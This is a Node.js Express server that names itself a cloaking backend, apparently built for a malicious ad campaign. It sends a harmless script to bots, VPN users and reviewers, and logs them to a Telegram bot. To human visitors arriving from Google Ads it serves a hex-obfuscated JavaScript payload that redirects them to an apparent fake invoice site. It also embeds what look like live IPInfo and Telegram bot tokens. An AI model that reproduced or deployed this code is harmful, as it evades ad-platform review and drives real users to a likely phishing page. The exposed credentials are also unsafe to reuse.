const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();

// Habilitar CORS para que tu frontend externo pueda llamar a este backend
app.use(cors());

const CONFIG = {
    IPINFO_TOKEN: 'f14749fee64f8f', // Tu token de IPInfo
    TG_TOKEN: '8425620613:AAGtK8DnpmnRcudQp_tIy4kc7MJuq0QUbPE', // Tu Bot Token
    TG_CHAT: '-5084022149', // Tu Chat ID
    DESTINO: 'https://aire-facturas-online.onrender.com/', 
    PORT: process.env.PORT || 3000
};

// --- LÓGICA DE FILTRADO ---
async function verificarVisitante(req) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua = (req.headers['user-agent'] || '').toLowerCase();

    // 1. Filtro de Bots por User-Agent
    const bots = ['googlebot', 'adsbot', 'lighthouse', 'bot', 'crawler', 'spider', 'headless'];
    if (bots.some(b => ua.includes(b))) return { ok: false, r: "Bot Detectado (UA)" };

    // 2. Filtro de IP (VPN, Proxies, Datacenters)
    try {
        const { data } = await axios.get(`https://ipinfo.io/${ip}?token=${CONFIG.IPINFO_TOKEN}`);
        if (data.privacy && (data.privacy.vpn || data.privacy.proxy || data.privacy.hosting)) {
            return { ok: false, r: "VPN/Hosting Detectado", d: data };
        }
        return { ok: true, d: data };
    } catch (e) {
        return { ok: true }; // Si la API falla, dejamos pasar para no perder clics
    }
}

// --- RUTA DEL SCRIPT DINÁMICO ---
app.get('/:slug', async (req, res) => {
    // Validar longitud del ID aleatorio (mínimo 40 caracteres)
    if (req.params.slug.length < 40) return res.status(404).end();

    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const check = await verificarVisitante(req);

    if (!check.ok) {
        // Enviar reporte a Telegram
        axios.post(`https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage`, {
            chat_id: CONFIG.TG_CHAT,
            text: `🚫 *BLOQUEO*\nIP: \`${ip}\`\nMotivo: ${check.r}\nOrg: ${check.d?.org || '?'}`,
            parse_mode: 'Markdown'
        }).catch(()=>{});

        // Enviar script inofensivo al revisor/bot
        return res.send("console.log('API Status: Active');");
    }

    // SI ES UN HUMANO REAL: Enviar el payload ofuscado de redirección
    res.set('Content-Type', 'application/javascript');
    const payload = `var _0x1a2b=["\x67\x63\x6C\x69\x64","\x67\x61\x64\x5F\x73\x6F\x75\x72\x63\x65","\x67\x62\x72\x61\x69\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x72\x65\x70\x6C\x61\x63\x65"];(function(){var u=new URLSearchParams(window.location.search);if(u.has(_0x1a2b[0])||u.has(_0x1a2b[1])||u.has(_0x1a2b[2])){window[_0x1a2b[3]][_0x1a2b[4]]("${CONFIG.DESTINO}")}})();`;
    res.send(payload);
});

app.listen(CONFIG.PORT, () => console.log(`Backend de cloaking activo en puerto ${CONFIG.PORT}`));



